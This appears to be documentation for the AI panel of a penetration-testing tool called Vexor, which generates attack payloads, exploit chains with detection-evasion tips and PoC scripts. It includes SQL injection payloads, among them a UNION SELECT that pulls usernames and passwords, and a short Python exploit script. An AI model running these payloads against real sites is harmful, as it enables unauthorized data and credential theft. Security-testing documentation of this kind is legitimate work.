# Vexor AI Panel — Complete Guide

The AI Panel provides 11 AI-powered security analysis actions.

---

## Setup

AI works automatically — no API key needed. It uses a multi-provider fallback:
```
Groq (fastest) → NVIDIA NIM → OpenRouter → HuggingFace
```

For best results, login first:
```bash
vexor auth login
```

---

## Open AI Panel

Press `F6` → AI Panel

---

## All 11 AI Actions

### 1. 🔍 Analyze Vulnerability

**What it does:** Deep analysis of a vulnerability finding.

**How to use:**
1. Paste the finding or HTTP request/response
2. Select "🔍 Analyze Vulnerability"
3. Click **🤖 Run AI**

**Input example:**
```
SQL Injection found in parameter 'id'
URL: https://target.com/user?id=1
Payload: ' OR 1=1--
Evidence: MySQL error: You have an error in your SQL syntax
```

**Output:** Exploitation steps, impact assessment, remediation

---

### 2. 💡 Explain Request/Response

**What it does:** Explains what an HTTP request/response does from a security perspective.

**How to use:**
1. Paste the HTTP request or response
2. Select "💡 Explain Request/Response"
3. Click **🤖 Run AI**

**Input example:**
```
POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"admin","password":"test123"}

---

HTTP/1.1 200 OK
Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9...
```

**Output:** Security analysis of the request/response, identified issues

---

### 3. ⚡ Suggest Next Attack

**What it does:** Suggests next attack steps based on current findings.

**How to use:**
1. Paste current findings or context
2. Select "⚡ Suggest Next Attack"
3. Click **🤖 Run AI**

**Input example:**
```
Target: https://target.com
Found: SQL injection in /user?id=1 (MySQL)
Found: Admin panel at /admin (403)
Found: Subdomain dev.target.com (200)
```

**Output:** Prioritized next steps, specific tools and commands

---

### 4. 🎯 Generate Payloads

**What it does:** Generates context-aware attack payloads.

**How to use:**
1. Describe the target and context
2. Select "🎯 Generate Payloads"
3. Click **🤖 Run AI**

**Input example:**
```
Target: PHP application with MySQL database
Parameter: username (login form)
Goal: SQL injection bypass
WAF: ModSecurity detected
```

**Output:** 20+ custom payloads with WAF bypass techniques

---

### 5. 🧹 Filter False Positives

**What it does:** Reviews findings and identifies false positives.

**How to use:**
1. Paste your findings list
2. Select "🧹 Filter False Positives"
3. Click **🤖 Run AI**

**Input example:**
```
[CRITICAL] SSRF in parameter 'url' - param name match only
[HIGH] XSS in search - payload reflected but HTML encoded
[CRITICAL] SQLi in id - MySQL error confirmed
[MEDIUM] Open redirect - redirects to evil.com confirmed
```

**Output:** Which findings are real vs false positives, confidence levels

---

### 6. 📄 Write Report Section

**What it does:** Writes a professional pentest report section.

**How to use:**
1. Paste your findings
2. Select "📄 Write Report Section"
3. Click **🤖 Run AI**

**Output:** Professional markdown report with executive summary, technical details, remediation

---

### 7. 🔥 Auto Exploit

**What it does:** Generates a complete exploit chain for a vulnerability.

**How to use:**
1. Paste the vulnerability details
2. Select "🔥 Auto Exploit"
3. Click **🤖 Run AI**

**Input example:**
```
SQL Injection in https://target.com/user?id=1
Database: MySQL 5.7
Error-based confirmed
UNION-based: 3 columns
```

**Output:**
- Step-by-step exploitation
- Working payload examples
- Data extraction queries
- Privilege escalation path
- Detection evasion tips

---

### 8. 📊 Risk Score (CVSS)

**What it does:** Calculates CVSS v3.1 score for a vulnerability.

**How to use:**
1. Paste the vulnerability details
2. Select "📊 Risk Score (CVSS)"
3. Click **🤖 Run AI**

**Output:**
- CVSS Base Score (0.0-10.0)
- CVSS Vector String
- Severity Rating
- Attack Vector analysis
- Impact analysis (CIA)

---

### 9. 🌐 Translate Report

**What it does:** Translates security reports to other languages.

**How to use:**
1. Paste the report text
2. Select "🌐 Translate Report"
3. Select target language
4. Click **🤖 Run AI**

**Supported languages:** English, Spanish, French, German, Chinese, Arabic, Portuguese, Russian, Japanese, Hindi

---

### 10. 💻 PoC Generator (via Scanner)

**What it does:** Generates a working Python exploit script.

**How to use:**
1. Run a scan (F3 → Scanner)
2. Click a finding row
3. Click **🧠 AI Analyze**
4. AI generates PoC script

**Output example:**
```python
# For authorized testing only
import requests

TARGET = "https://target.com/user"

def exploit():
    # Test SQL injection
    payload = "1' UNION SELECT username,password,3 FROM users--"
    resp = requests.get(TARGET, params={"id": payload})
    
    # Extract data
    import re
    data = re.findall(r'<td>(.*?)</td>', resp.text)
    print(f"Extracted: {data}")

exploit()
```

---

### 11. 💬 Chat History

The AI remembers the last 20 exchanges in a session.

**View history:** Click **📋 History** button

**Clear history:** Click **⊘ Clear** button

---

## Tips

### Best Practices

1. **Be specific** — more context = better analysis
2. **Include evidence** — paste actual response snippets
3. **Mention technology** — "PHP/MySQL", "Node.js/MongoDB"
4. **State the goal** — "I need to extract database contents"

### Example: Complete Vulnerability Analysis

```
Input:
Target: https://shop.example.com/product?id=1
Vulnerability: SQL Injection (confirmed)
Database: MySQL 5.7.38
Evidence: 
  Payload: 1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
  Response: XPATH syntax error: '~5.7.38-log'
  
  UNION test: 1 UNION SELECT NULL,NULL,NULL-- (3 columns)
  
Current access: Unauthenticated user
Goal: Extract admin credentials

Action: 🔥 Auto Exploit
```

### Provider Status

The AI panel shows which provider is being used:
```
Provider: Groq  ·  ~450 tokens  ·  1.2s
```

If one provider fails, it automatically tries the next.
